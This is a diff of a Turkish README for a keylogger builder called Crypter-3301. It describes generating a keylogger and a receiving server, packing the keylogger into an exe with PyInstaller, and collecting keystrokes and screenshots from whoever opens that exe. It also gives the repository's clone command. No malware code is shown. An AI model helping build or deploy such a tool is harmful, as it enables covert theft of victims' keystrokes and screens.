@@ -6,8 +6,9 @@ Desteklerin için teşekkür ederim Dostum🙏🏻 (Ero145)
 
 Program başlandığında bazı kütüphanelerin yüklü olup olmadığını kontrol eder. Ardından banner gelir ve keylogger.py, server.py, 
 keylog.txt(Sunucuya gelen tuşlar bu dosyaya kaydedilir) ve images klasörü(SS lerin geleceği klasör) gibi gerekli dosyaları masaüstüne oluşturur.
-Sonra program sizde oluşturulan keylogger.py dosyasının yolunu ister. Yoldoğu girilince python dosyasını exe ye çevirir(PyInstaller ile).
+Sonra program sizden oluşturulan keylogger.py dosyasının yolunu ister. Doğru Yol girilince python dosyasını exe ye çevirir(PyInstaller ile).
 Exe başarılı bir şekilde oluşturulursa server.py çalıştırılır ve oluşturulan exe'nin açılması beklenir. Bazı ufak hatalar olabilir(Ufak hataları düzelteceğiz).
+Unutmayın: !Dosyadaki desktop_path değişkenini Kali Linux'un masaüstü yolu yapın!
 
 git clone https://github.com/zer0crypt02/Crypter-3301<br>
 cd Crypter-3301<br>
